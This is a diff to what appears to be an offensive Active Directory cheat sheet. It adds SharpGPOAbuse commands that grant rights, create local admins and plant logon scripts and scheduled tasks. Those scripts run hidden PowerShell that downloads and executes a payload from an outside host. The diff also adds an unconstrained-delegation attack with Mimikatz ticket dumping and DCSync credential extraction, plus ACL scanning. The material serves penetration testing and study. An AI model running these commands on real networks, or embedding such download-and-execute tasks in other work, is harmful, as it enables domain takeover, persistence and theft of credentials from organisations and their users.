@@ -10,6 +10,7 @@
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
+    - [Exploit Group Policy Objects GPO](#exploit-group-policy-objects-gpo)
     - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
       - [Using ndtsutil](#using-ndtsutil)
       - [Using Vshadow](#using-vshadow)
@@ -47,13 +48,13 @@
     - [Abusing Active Directory ACLs/ACEs](#abusing-active-directory-aclsaces)
     - [Trust relationship between domains](#trust-relationship-between-domains)
     - [Child Domain to Forest Compromise - SID Hijacking](#child-domain-to-forest-compromise---sid-hijacking)
-    - [Unconstrained delegation](#unconstrained-delegation)
+    - [Kerberos Unconstrained Delegation](#kerberos-unconstrained-delegation)
       - [Find delegation](#find-delegation)
       - [Monitor with Rubeus](#monitor-with-rubeus)
       - [Force a connect back from the DC](#force-a-connect-back-from-the-dc)
       - [Load the ticket](#load-the-ticket)
       - [Mitigation](#mitigation)
-    - [Resource-Based Constrained Delegation](#resource-based-constrained-delegation)
+    - [Kerberos Resource Based Constrained Delegation](#kerberos-resource-based-constrained-delegation)
     - [Relay delegation with mitm6](#relay-delegation-with-mitm6)
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
@@ -388,6 +389,23 @@ Get-NetGPOGroup
 * Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.
 * Delete existing GPP xml files in SYSVOL containing passwords.
 * Don’t put passwords in files that are accessible by all authenticated users.
+
+### Exploit Group Policy Objects GPO
+
+```powershell
+# Adding User Rights
+SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"
+
+# Adding a Local Admin
+SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"
+
+# Configuring a User or Computer Logon Script
+SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+
+# Configuring a Computer or User Immediate Task
+SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"
+```
+
 
 ### Dumping AD Domain Credentials
 
@@ -1011,6 +1029,12 @@ Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccount
     Add-ObjectACL -TargetDistinguishedName "dc=dev,dc=testlab,dc=local" -PrincipalSamAccountName titi -Rights DCSync
     ```
 
+Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).
+
+```powershell
+ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
+```
+
 
 ### Trust relationship between domains
 
@@ -1047,9 +1071,16 @@ Prerequisite:
     kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
     ```
 
-### Unconstrained delegation
+### Kerberos Unconstrained Delegation
 
 > The user sends a TGS to access the service, along with their TGT, and then the service can use the user’s TGT to request a TGS for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html
+
+Domain Compromise via DC Print Server and Unconstrained Delegation
+
+Prerequisites:
+- Object with Property "Trust this computer for delegation to any service (Kerberos only)"
+- Must have ADS_UF_TRUSTED_FOR_DELEGATION 
+- Must not have ADS_UF_NOT_DELEGATED flag
 
 #### Find delegation
 
@@ -1097,7 +1128,9 @@ Extract the base64 TGT from Rubeus output and load it to our current session.
 .\Rubeus.exe asktgs /ticket:<ticket base64> /ptt
 ```
 
-Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HACKER\krbtgt`
+Alternatively you could also grab the ticket using Mimikatz :  `mimikatz # sekurlsa::tickets`
+
+Then you can use DCsync or another attack : `mimikatz # lsadump::dcsync /user:HACKER\krbtgt`
 
 
 #### Mitigation
@@ -1105,7 +1138,7 @@ Then you can use DCsync or another attack : `Mimikatz> lsadump::dcsync /user:HAC
 * Ensure sensitive accounts cannot be delegated
 * Disable the Print Spooler Service
 
-### Resource-Based Constrained Delegation
+### Kerberos Resource Based Constrained Delegation
 
 Resource-based Constrained Delegation was introduced in Windows Server 2012. 
 
@@ -1470,3 +1503,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 6b3723410a3c5
 * [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https:/www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
 * [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
 * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
+* [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
